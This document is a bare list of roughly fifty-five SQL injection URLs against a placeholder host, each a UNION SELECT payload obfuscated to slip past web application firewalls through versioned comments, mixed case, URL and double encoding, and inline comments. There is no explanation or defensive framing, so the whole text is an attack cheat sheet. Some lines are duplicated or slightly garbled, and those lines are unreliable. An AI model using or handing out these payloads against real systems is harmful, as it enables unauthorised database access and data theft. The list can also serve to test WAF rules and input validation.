```
http://domain.com/index.php?id=1 /*!50000%55nIoN*/ /*!50000%53eLeCt*/ 1,2,3,4-- -  
http://domain.com/index.php?id=1 %55nion(%53elect 1,2,3) 1,2,3,4-- -  
http://domain.com/index.php?id=1+union+distinctROW+select+1,2,3,4--+-  
http://domain.com/index.php?id=1+ #?uNiOn + #?sEleCt 1,2,3,4-- -  
http://domain.com/index.php?id=1 + #?1q %0AuNiOn all#qa%0A#%0AsEleCt 1,2,3,4-- -  
http://domain.com/index.php?id=1 /*!%55NiOn*/ /*!%53eLEct*/ 1,2,3,4-- -  
http://domain.com/index.php?id=1 +un/**/ion+se/**/lect 1,2,3,4-- -  
http://domain.com/index.php?id=1 +?UnI?On?+'SeL?ECT? 1,2,3,4-- -  
http://domain.com/index.php?id=1+(UnIoN)+(SelECT)+1,2,3,4--+-  
http://domain.com/index.php?id=1 +UnIoN/*&a=*/SeLeCT/*&a=*/ 1,2,3,4-- -  
http://domain.com/index.php?id=1 %55nion(%53elect 1,2,3,4)-- -  
http://domain.com/index.php?id=1 /**//*!12345UNION SELECT*//**/ 1,2,3,4-- -  
http://domain.com/index.php?id=1 /**//*!50000UNION SELECT*//**/ 1,2,3,4-- -  
http://domain.com/index.php?id=1 /**/UNION/**//*!50000SELECT*//**/ 1,2,3,4-- -  
http://domain.com/index.php?id=1 /*!50000UniON SeLeCt*/ 1,2,3,4-- -  
http://domain.com/index.php?id=1 union /*!50000%53elect*/ 1,2,3,4-- -  
http://domain.com/index.php?id=1 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4-- -  
http://domain.com/index.php?id=1 /*--*/union/*--*/select/*--*/ 1,2,3,4-- -  
http://domain.com/index.php?id=1 union (/*!/**/ SeleCT */ 1,2,3,4)-- -  
http://domain.com/index.php?id=1 /*!union*/+/*!select*/ 1,2,3,4-- -  
http://domain.com/index.php?id=1 /**/uNIon/**/sEleCt/**/ 1,2,3,4-- -  
http://domain.com/index.php?id=1 +%2F**/+Union/*!select*/ 1,2,3,4-- -  
http://domain.com/index.php?id=1 /**//*!union*//**//*!select*//**/ 1,2,3,4-- -  
http://domain.com/index.php?id=1 /*!uNIOn*/ /*!SelECt*/ 1,2,3,4-- -  
http://domain.com/index.php?id=1 /**/union/*!50000select*//**/ 1,2,3,4-- -  
http://domain.com/index.php?id=1 0%a0union%a0select%09 1,2,3,4-- -  
http://domain.com/index.php?id=1 %0Aunion%0Aselect%0A 1,2,3,4-- -  
http://domain.com/index.php?id=1 uni<on all="" sel="">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,3,4-- -  
http://domain.com/index.php?id=1 %252f%252a*/UNION%252f%252a /SELECT%252f%252a*/ 1,2,3,4-- -  
http://domain.com/index.php?id=1 /*!union*//*--*//*!all*//*--*//*!select*/ 1,2,3,4-- -  
http://domain.com/index.php?id=1 union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C 1,2,3,4-- -
http://domain.com/index.php?id=1 /*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/ 1,2,3,4-- -  
http://domain.com/index.php?id=1 +UnIoN/*&a=*/SeLeCT/*&a=*/ 1,2,3,4-- -  
http://domain.com/index.php?id=1 union+sel%0bect 1,2,3,4-- -  
http://domain.com/index.php?id=1 +#1q%0Aunion all#qa%0A#%0Aselect 1,2,3,4-- -  
http://domain.com/index.php?id=1 %23xyz%0AUnIOn%23xyz%0ASeLecT+ 1,2,3,4-- -  
http://domain.com/index.php?id=1 %23xyz%0A%55nIOn%23xyz%0A%53eLecT+ 1,2,3,4-- -  
http://domain.com/index.php?id=1 union(select(1),2,3)-- -  
http://domain.com/index.php?id=1 uNioN (/*!/**/ SeleCT */ 11) 1,2,3,4-- -  
http://domain.com/index.php?id=1 /**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/ 1,2,3,4-- -  
http://domain.com/index.php?id=1 %0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/ 1,2,3,4-- -  
http://domain.com/index.php?id=1 +union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C 1,2,3,4-- -  
http://domain.com/index.php?id=1 /*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/ 1,2,3,4-- -  
http://domain.com/index.php?id=1 +UnIoN/*&a=*/SeLeCT/*&a=*/ 1,2,3,4-- -  
http://domain.com/index.php?id=1 +/*!UnIoN*/+/*!SeLeCt*/+ 1,2,3,4-- -  
http://domain.com/index.php?id=1 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4-- -  
http://domain.com/index.php?id=1 uni%20union%20/*!select*/%20 1,2,3,4-- -  
http://domain.com/index.php?id=1 union%23aa%0Aselect 1,2,3,4-- -  
http://domain.com/index.php?id=1/**/union/*!50000select*/ 1,2,3,4-- -  
http://domain.com/index.php?id=1 /^****union.*$/ /^****select.*$/ 1,2,3,4-- -  
http://domain.com/index.php?id=1 /*union*/union/*select*/select+ 1,2,3,4-- -  
http://domain.com/index.php?id=1 /*!50000UnION*//*!50000SeLeCt*/ 1,2,3,4-- -  
http://domain.com/index.php?id=1 %252f%252a*/union%252f%252a /select%252f%252a*/ 1,2,3,4-- -  
http://domain.com/index.php?id=1 AnD null UNiON SeLeCt 1,2,3,4;%00-- -  
http://domain.com/index.php?id=1 AnD null UNiON SeLeCt 1,2,3,4+--+-  
http://domain.com/index.php?id=1 And False Union Select 1,2,3,4+--+- 
```